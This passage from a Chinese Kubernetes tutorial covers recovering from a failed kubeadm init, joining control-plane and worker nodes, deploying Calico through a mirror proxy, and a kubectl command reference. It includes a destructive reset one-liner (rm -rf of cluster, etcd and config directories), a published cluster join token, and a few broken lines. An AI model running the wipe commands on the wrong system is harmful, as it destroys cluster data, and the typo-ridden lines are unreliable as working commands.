kubeadm-config.yaml<br><br><span class="hljs-comment"># 查问题：</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：</p><ol><li>如果初始化集群失败，我们可以：</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 查问题</span><br><span class="hljs-built_in">sudo</span> journalctl -u kubelet -f<br><br><span class="hljs-built_in">sudo</span> systemctl status kubelet<br><br><br><span class="hljs-comment"># 2. 清除相关文件和进程</span><br>kubeadm reset &amp;&amp; <span class="hljs-built_in">rm</span> -rf /etc/kubernetes/ &amp;&amp; <span class="hljs-built_in">rm</span> -rf /var/lib/cni &amp;&amp; <span class="hljs-built_in">rm</span> -rf /var/lib/kubelet &amp;&amp; <span class="hljs-built_in">rm</span> -rf /var/lib/etcd &amp;&amp; <span class="hljs-built_in">rm</span> -rf <span class="hljs-variable">$HOME</span>/.kube/config &amp;&amp; ipvsadm -C &amp;&amp; <span class="hljs-built_in">sudo</span> systemctl stop kubelet<br><br><br><span class="hljs-comment"># 3. 重新初始化</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.保存官方提示信息&#x3D;&#x3D;</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Your Kubernetes control-plane has initialized successfully!<br><br>To <span class="hljs-built_in">start</span> <span class="hljs-keyword">using</span> your cluster, you need <span class="hljs-built_in">to</span> run <span class="hljs-keyword">the</span> following <span class="hljs-keyword">as</span> <span class="hljs-keyword">a</span> regular user:<br><br>  mkdir -p $HOME/.kube<br>  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config<br>  sudo chown $(id -u):$(id -g) $HOME/.kube/config<br><br>Alternatively, <span class="hljs-keyword">if</span> you are <span class="hljs-keyword">the</span> root user, you can run:<br><br>  export KUBECONFIG=/etc/kubernetes/admin.conf<br><br>You should now deploy <span class="hljs-keyword">a</span> pod network <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> cluster.<br>Run <span class="hljs-string">&quot;kubectl apply -f [podnetwork].yaml&quot;</span> <span class="hljs-keyword">with</span> <span class="hljs-literal">one</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> options listed <span class="hljs-keyword">at</span>:<br>  <span class="hljs-keyword">https</span>://kubernetes.io/docs/concepts/cluster-administration/addons/<br><br>You can now join <span class="hljs-keyword">any</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> control-plane nodes <span class="hljs-keyword">by</span> copying certificate authorities<br><span class="hljs-keyword">and</span> service account <span class="hljs-built_in">keys</span> <span class="hljs-keyword">on</span> <span class="hljs-title">each</span> <span class="hljs-title">node</span> <span class="hljs-title">and</span> <span class="hljs-title">then</span> <span class="hljs-title">running</span> <span class="hljs-title">the</span> <span class="hljs-title">following</span> <span class="hljs-title">as</span> <span class="hljs-title">root</span>:<br><br>  kubeadm join <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.100</span>:<span class="hljs-number">6443</span> <span class="hljs-comment">--token pgauot.eh1ad4drixh1z72b \</span><br>        <span class="hljs-comment">--discovery-token-ca-cert-hash sha256:3d27a9471694ab6159533f0d3ca0bc2ddffed8447358950f6732b0f10e770d70 \</span><br>        <span class="hljs-comment">--control-plane </span><br><br>Then you can join <span class="hljs-keyword">any</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> worker nodes <span class="hljs-keyword">by</span> running <span class="hljs-keyword">the</span> following <span class="hljs-keyword">on</span> <span class="hljs-title">each</span> <span class="hljs-title">as</span> <span class="hljs-title">root</span>:<br><br>kubeadm join <span class="hljs-number">192.168</span><span class="hljs-number">.136</span><span class="hljs-number">.100</span>:<span class="hljs-number">6443</span> <span class="hljs-comment">--token pgauot.eh1ad4drixh1z72b \</span><br>        <span class="hljs-comment">--discovery-token-ca-cert-hash sha256:3d27a9471694ab6159533f0d3ca0bc2ddffed8447358950f6732b0f10e770d70 </span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.配置 kubectl 的访问凭据&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 创建 .kube 目录（用于存放 kubectl 的配置文件）</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/.kube<br><br><br><span class="hljs-comment"># 2. 复制 kubeadm 初始化生成的管理员配置文件到当前用户目录</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cp</span> -i /etc/kubernetes/admin.conf  <span class="hljs-variable">$HOME</span>/.kube/config<br><br><br><span class="hljs-comment"># 3. 更改该配置文件的所有者为当前用户（否则你访问时可能会权限不足）</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> $(<span class="hljs-built_in">id</span> -u):$(<span class="hljs-built_in">id</span> -g) <span class="hljs-variable">$HOME</span>/.kube/config<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.calico 网络插件部署&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 设置 Calico 版本为 v3.28.2</span><br>CALICO_VERSION=v3.28.2<br><br><br><span class="hljs-comment"># 2. 从 OpenNeeds 镜像仓库下载指定版本的 Calico 配置文件</span><br><span class="hljs-built_in">sudo</span> wget https://hub.openeeds.com/https://raw.githubusercontent.com/projectcalico/calico/<span class="hljs-variable">$CALICO_VERSION</span>/manifests/calico.yaml<br><br><br><span class="hljs-comment"># 3. 替换 yaml 文件中的镜像源，将所有的 docker.io 替换为 hub.openeeds.com</span><br><span class="hljs-built_in">sudo</span> sed -i <span class="hljs-string">&#x27;s/docker.io/hub.openeeds.com/g&#x27;</span> calico.yaml<br><br><br><span class="hljs-comment"># 4. 从 OpenNeeds 镜像仓库拉取所有涉及的 Calico 镜像</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cat</span> calico.yaml | grep hub.openeeds.com | sed <span class="hljs-string">&#x27;s/          image://g&#x27;</span> | xargs -n 1 crictl pull<br><br><br><span class="hljs-comment"># 5. 使用 kubectl 应用 Calico 配置文件，部署 Calico 网络插件</span><br>kubectl apply -f calico.yaml<br><br><br><span class="hljs-comment"># 6. 查看 Calico 是否成功部署</span><br>kubectl get pod -n kube-system<br></code></pre></td></tr></table></figure><hr><h3 id="6-部署其他-Master-节点"><a href="#6-部署其他-Master-节点" class="headerlink" title="6. 部署其他 Master 节点"></a>6. 部署其他 Master 节点</h3><p>&#x3D;&#x3D;1.复制 Kubernetes 集群配置和证书到其他节点&#x3D;&#x3D;<br>以下命令需要在第一个 Master 节点（192.168.136.9）上执行</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">ssh root<span class="hljs-variable">@192</span>.<span class="hljs-number">168.136</span>.<span class="hljs-number">9</span> mkdir -p /etc/kubernetes/pki/etcd<br><br>scp /etc/kubernetes/admin.conf root<span class="hljs-variable">@192</span>.<span class="hljs-number">168.136</span>.<span class="hljs-number">9</span><span class="hljs-symbol">:/etc/kubernetes</span><br><br>scp /etc/kubernetes/pki/&#123;ca.*,sa.*,front-proxy-ca.*&#125; root<span class="hljs-variable">@192</span>.<span class="hljs-number">168.136</span>.<span class="hljs-number">9</span><span class="hljs-symbol">:/etc/kubernetes/pki</span><br><br>scp /etc/kubernetes/pki/etcd/ca.* root<span class="hljs-variable">@192</span>.<span class="hljs-number">168.136</span>.<span class="hljs-number">9</span><span class="hljs-symbol">:/etc/kubernetes/pki/etcd</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.加入到集群&#x3D;&#x3D;<br>在保存信息中，加上 <code>--control-plane</code> 参数，表明这是一个 master</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kubeadm</span> join <span class="hljs-number">192.168.136.100:6443</span> --token pgauot.eh1ad4drixh1z72b <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>      --discovery-token-ca-cert-hash sha256:<span class="hljs-number">3</span>d27a9471694ab6159533f0d3ca0bc2ddffed8447358950f6732b0f10e770d70 <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>      --control-plane <br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.配置 kubectl 的访问凭据&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 创建 .kube 目录（用于存放 kubectl 的配置文件）</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$HOME</span>/.kube<br><br><br><span class="hljs-comment"># 2. 复制 kubeadm 初始化生成的管理员配置文件到当前用户目录</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cp</span> -i /etc/kubernetes/admin.conf  <span class="hljs-variable">$HOME</span>/.kube/config<br><br><br><span class="hljs-comment"># 3. 更改该配置文件的所有者为当前用户（否则你访问时可能会权限不足）</span><br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chown</span> $(<span class="hljs-built_in">id</span> -u):$(<span class="hljs-built_in">id</span> -g) <span class="hljs-variable">$HOME</span>/.kube/config<br></code></pre></td></tr></table></figure><hr><h3 id="7-部署-Node-节点"><a href="#7-部署-Node-节点" class="headerlink" title="7. 部署 Node 节点"></a>7. 部署 Node 节点</h3><p>在保存信息中，不加 <code>--control-plane</code> 参数，表明这是一个 node</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kubeadm</span> join <span class="hljs-number">192.168.136.100:6443</span> --token pgauot.eh1ad4drixh1z72b <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>        --discovery-token-ca-cert-hash sha256:<span class="hljs-number">3</span>d27a9471694ab6159533f0d3ca0bc2ddffed8447358950f6732b0f10e770d70 <br></code></pre></td></tr></table></figure><hr><h1 id="三、工具"><a href="#三、工具" class="headerlink" title="三、工具"></a>三、工具</h1><h3 id="1-cAdvisor"><a href="#1-cAdvisor" class="headerlink" title="1. cAdvisor"></a>1. cAdvisor</h3><hr><h1 id="三、补充"><a href="#三、补充" class="headerlink" title="三、补充"></a>三、补充</h1><h3 id="1-Kubectl-命令"><a href="#1-Kubectl-命令" class="headerlink" title="1. Kubectl 命令"></a>1. Kubectl 命令</h3><p>&#x3D;&#x3D;1.创建资源&#x3D;&#x3D;</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 1. 创建单个 Pod（内部只有一个容器）</span><br>kubectl <span class="hljs-built_in">run</span> &lt;pod-name&gt; <span class="hljs-attribute">--image</span>=&lt;image&gt;<br><br><br><span class="hljs-comment"># 2. 根据 yaml 创建资源</span><br> kubectl apply -f resource.yaml<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.删除资源&#x3D;&#x3D;</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs vim"># <span class="hljs-number">1</span>. 根据资源名称删除资源<br>kubectl <span class="hljs-keyword">delete</span> <span class="hljs-symbol">&lt;resource-type&gt;</span> <span class="hljs-symbol">&lt;resource-name&gt;</span> -n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br># <span class="hljs-number">2</span>. 根据标签删除资源（只要有该标签的资源，都会被删除）<br>kubectl <span class="hljs-keyword">delete</span>&lt;resource-<span class="hljs-built_in">type</span> -<span class="hljs-keyword">l</span> <span class="hljs-symbol">&lt;label-key&gt;</span>=<span class="hljs-symbol">&lt;label-value&gt;</span> -n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br># <span class="hljs-number">3</span>. 根据 yaml 删除资源<br>kubectl <span class="hljs-keyword">delete</span> -<span class="hljs-keyword">f</span> /path/<span class="hljs-keyword">to</span>/myFile.yaml<br><br><br># <span class="hljs-number">4</span>. 删除某命名空间下的所有 pod<br>kubectl <span class="hljs-keyword">delete</span> pods --<span class="hljs-keyword">all</span> -n <span class="hljs-symbol">&lt;namespace&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：</p><ol><li>Controller 可以附加参数 <code>--cascade=orphan</code>，表示仅删除 Controller 不删除关联的 Pod</li><li>可以附加参数 <code>--force --grace-period=0</code> ，表示强行删除</li></ol></blockquote><p>&#x3D;&#x3D;3.更新资源&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 简单更新（使用默认的编辑器编辑一个资源，重启后恢复原状态）</span><br>kubectl edit <span class="hljs-symbol">&lt;resource-type&gt;</span> <span class="hljs-symbol">&lt;resource-name&gt;</span> <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 2. 复杂更新（修改 yaml 文件后重新 apply）</span><br>kubectl apply <span class="hljs-operator">-</span>f resource.yaml<br><br><br><span class="hljs-comment"># 3. 调整 Controller 管理的 Pod 数量</span><br>kubectl scale <span class="hljs-symbol">&lt;controller-type&gt;</span> <span class="hljs-symbol">&lt;controller-name&gt;</span> <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span> <span class="hljs-operator">-</span>-replicas<span class="hljs-operator">=</span><span class="hljs-symbol">&lt;number&gt;</span><br><br><br><span class="hljs-comment"># 4. 修改 Deployment 镜像（触发滚动更新）</span><br>kubectl set image deployment <span class="hljs-symbol">&lt;deployment-name&gt;</span> <span class="hljs-symbol">&lt;container-name&gt;</span><span class="hljs-operator">=</span><span class="hljs-symbol">&lt;new-image&gt;</span> <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 5. 查看 Deployment 当前滚动更新状态</span><br>kubectl rollout status deployment <span class="hljs-symbol">&lt;deployment-name&gt;</span> <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 6. 暂停 Deployment 滚动更新</span><br>kubectl rollout pause deployment <span class="hljs-symbol">&lt;deployment-name&gt;</span> <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 7. 恢复 Deployment 滚动更新</span><br>kubectl rollout resume deployment <span class="hljs-symbol">&lt;deployment-name&gt;</span> <span class="hljs-operator">-</span>n <span class="hljs-operator">&lt;</span>amespace<br><br><br><span class="hljs-comment"># 8. 查看 Deployment 历史版本</span><br>kubectl rollout history deployment <span class="hljs-symbol">&lt;deployment-name&gt;</span> <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 9. 回滚 Deployment 到上一个版本</span><br>kubectl rollout undo deployment <span class="hljs-symbol">&lt;deployment-name&gt;</span> <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 10. 回滚 Deployment 到指定版本</span><br>kubectl rollout undo deployment <span class="hljs-symbol">&lt;deployment-name&gt;</span> <span class="hljs-operator">-</span>-to-revision<span class="hljs-operator">=</span><span class="hljs-symbol">&lt;revision-number&gt;</span> <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 11. 强制重启 Deployment，触发滚动更新</span><br>kubectl rollout restart deployment <span class="hljs-symbol">&lt;deployment-name&gt;</span> <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>对 <code>ReplicationController (RC)</code> 和 <code>ReplicaSet (RS)</code> 进行复杂更新时，新的 Pod 不会自动替换旧的 Pod，我们需要手动删除旧 Pod</li><li>但是对于 <code>Deployment</code> ，他会触发滚动更新，这些都不需要我们操心</li></ol></blockquote><p>&#x3D;&#x3D;4.查询资源&#x3D;&#x3D;</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-comment"># 1. 获取资源概览信息（只显示核心字段，适用于快速查看资源状态）</span><br>kubectl get <span class="hljs-variable">&lt;resource-type&gt;</span> <span class="hljs-variable">&lt;resource-name&gt;</span> -o wide -n <span class="hljs-variable">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 2. 查看资源详细信息（显示完整的资源信息，适用于排查问题或查看详细配置）</span><br>kubectl describe <span class="hljs-variable">&lt;resource-type&gt;</span> <span class="hljs-variable">&lt;resource-name&gt;</span> -o wide -n <span class="hljs-variable">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 3. 查看某 namespace 下的所有资源</span><br>kubectl get <span class="hljs-literal">all</span> -n <span class="hljs-variable">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 4. 查看节点资源使用情况</span><br>kubectl top node<br><br><br><span class="hljs-comment"># 5. 查看 Pod 资源使用情况</span><br>kubectl top pod -n <span class="hljs-variable">&lt;namespace&gt;</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.执行命令到容器&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 模版</span><br>kubectl <span class="hljs-built_in">exec</span> &lt;pod-name&gt; -n &lt;namespace&gt; -- &lt;实际命令&gt;<br><br><br><span class="hljs-comment"># 2. 进入 Pod</span><br>kubectl <span class="hljs-built_in">exec</span> -it &lt;pod-name&gt; -- /bin/bash<br><br><br><span class="hljs-comment"># 3. 查看 Pod 内部的文件</span><br>kubectl <span class="hljs-built_in">exec</span> &lt;pod-name&gt; -- <span class="hljs-built_in">cat</span> /etc/hosts<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;6.节点相关命令&#x3D;&#x3D;</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-comment"># 1. 查看 Node 列表（包含 Master 节点和 Worker 节点）</span><br>kubectl get nodes<br><br><br><span class="hljs-comment"># 2. 为 Node 节点添加 Label</span><br>kubectl <span class="hljs-keyword">label</span> nodes <span class="hljs-variable">&lt;node-name&gt;</span> <span class="hljs-variable">&lt;label-key&gt;</span>=<span class="hljs-variable">&lt;label-value&gt;</span><br><br><br><span class="hljs-comment"># 3. 为 Node 节点删除 Label</span><br>kubectl <span class="hljs-keyword">label</span> nodes <span class="hljs-variable">&lt;node-name&gt;</span> <span class="hljs-variable">&lt;label-key&gt;</span>-<br><br><br><span class="hljs-comment"># 4. 查看节点资源使用情况</span><br>kubectl top node<br><br><br><span class="hljs-comment"># 5. 查看 Node 节点详细信息（验证标签是否添加成功）</span><br>kubectl describe node <span class="hljs-variable">&lt;node-name&gt;</span><br><br><br><span class="hljs-comment"># 6. 将 Node 标记为不可调度（不会影响已运行的 Pod）</span><br>kubectl cordon <span class="hljs-variable">&lt;node-name&gt;</span><br><br><br><span class="hljs-comment"># 7. 将 Node 恢复为可调度</span><br>kubectl uncordon <span class="hljs-variable">&lt;node-name&gt;</span><br><br><br><span class="hljs-comment"># 8. 驱逐 Node 上的所有 Pod，并标记为不可调度</span><br>kubectl drain <span class="hljs-variable">&lt;node-name&gt;</span> --ignore-daemonsets --delete-emptydir-data<br><br><br><span class="hljs-comment"># 9. 为 Node 添加污点</span><br>kubectl taint nodes <span class="hljs-variable">&lt;node-name&gt;</span> <span class="hljs-variable">&lt;taint-key&gt;</span>=<span class="hljs-variable">&lt;taint-value&gt;</span>:<span class="hljs-variable">&lt;taint-effect&gt;</span><br><br><br><span class="hljs-comment"># 10. 为 Node 移除污点</span><br>kubectl taint nodes <span class="hljs-variable">&lt;node-name&gt;</span> <span class="hljs-variable">&lt;taint-key&gt;</span>-<br><br><br><span class="hljs-comment"># 11. 为 Node 移除所有污点</span><br>kubectl patch nodes <span class="hljs-variable">&lt;node-name&gt;</span> -p &#x27;&#123;<span class="hljs-string">&quot;spec&quot;</span>:&#123;<span class="hljs-string">&quot;taints&quot;</span>:[]&#125;&#125;&#x27;<br><br><br><span class="hljs-comment"># 12. 查看 Node 上的污点</span><br>kubectl get nodes <span class="hljs-variable">&lt;node-name&gt;</span> -o go-template=<span class="hljs-string">&quot;&#123;&#123;.spec.taints&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：<code>taint-effect</code></p><ol><li><code>taint-effect</code> 表示排斥等级，主要有三种：<ul><li><font color="#00b0f0">NoSchedule</font>：<ul><li>调度器不会将不具备相应容忍度的 Pod 调度到该节点，但已经在该节点运行的 Pod 不受影响。</li></ul></li><li><font color="#00b0f0">PreferNoSchedule</font>：<ul><li>节点“建议”调度器不要将不具备相应容忍度的 Pod 调度到该节点，然而如果其他节点无法容纳，仍然可以将 Pod 调度到该节点</li></ul></li><li><font color="#00b0f0">NoExecute</font>：<ul><li>调度器不会将不具备相应容忍度的 Pod 调度到该节点，并且还会将已在该节点运行但不满足容忍度的 Pod 驱逐出去。</li><li>同时，还可以配置 <code>tolerationSeconds</code>，即使 Pod 已声明容忍该污点，也会在指定时间后被驱逐。</li></ul></li></ul></li></ol></blockquote><p>&#x3D;&#x3D;7.探针相关命令&#x3D;&#x3D;</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 查看探针状态</span><br>kubectl describe pod <span class="hljs-symbol">&lt;pod-name&gt;</span> <span class="hljs-operator">-</span>n <span class="hljs-symbol">&lt;namespace&gt;</span><br><br><br><span class="hljs-comment"># 2. 手动执行探针命令</span><br><span class="hljs-comment"># 2.1. 进入 Pod 内部</span><br>kubectl exec <span class="hljs-operator">-</span>it <span class="hljs-symbol">&lt;pod-name&gt;</span> <span class="hljs-operator">-</span>- <span class="hljs-symbol">/bin/sh</span><br><br><span class="hljs-comment"># 2.2. exec 探针</span><br><span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c <span class="hljs-string">&quot;your_probe_command&quot;</span><br><br><span class="hljs-comment"># 2.3. HTTP 探针</span><br>curl <span class="hljs-operator">-</span>v http:<span class="hljs-operator">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-symbol">/health</span><br><br><span class="hljs-comment"># 2.4. TCP 探针</span><br><span class="hljs-params">nc:</span> connect to localhost port <span class="hljs-number">8080</span> (tcp) <span class="hljs-params">failed:</span> Connection refused<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;8.注意事项&#x3D;&#x3D;</p><ol><li>如果未指定 namespace，会使用当前上下文指定的 namespace</li><li>对于 <code>resource-type resource-name</code> 这种的，如果没指定 <code>resource-name</code> 会作用于全部 <code>resource-type</code> 的资源</li></ol><hr><h3 id="2-操作符-operator"><a href="#2-操作符-operator" class="headerlink" title="2. 操作符 operator"></a>2. 操作符 operator</h3><p><code>operator</code> 字段是用来判断的操作符，常见有以下几种：</p><ol><li>&#x3D;&#x3D;Equal&#x3D;&#x3D;：<ul><li>判断键值对是否相等。</li><li>适用于您需要完全匹配键和值的情况。</li><li>示例：<code>key: &quot;key1&quot;, operator: &quot;Equal&quot;, value: &quot;value1&quot;</code></li></ul></li><li>&#x3D;&#x3D;In&#x3D;&#x3D;：<ul><li>判断值是否在指定的集合中。</li><li>适用于多个可能值的容忍度判断。</li><li>示例：<code>key: &quot;key1&quot;, operator: &quot;In&quot;, values: [&quot;value1&quot;, &quot;value2&quot;]</code></li></ul></li><li>&#x3D;&#x3D;NotIn&#x3D;&#x3D;：<ul><li>判断值是否不在指定的集合中。</li><li>适用于您需要排除某些值的情况。</li><li>示例：<code>key: &quot;key1&quot;, operator: &quot;NotIn&quot;, values: [&quot;value1&quot;, &quot;value2&quot;]</code></li></ul></li><li>&#x3D;&#x3D;Exists&#x3D;&#x3D;：<ul><li>只检查键是否存在，而不关心它的值。</li><li>适用于您只关心键的存在性，而不关心具体的值。</li><li>示例：<code>key: &quot;key1&quot;, operator: &quot;Exists&quot;</code> （不需要指定 <code>value</code>）<figure 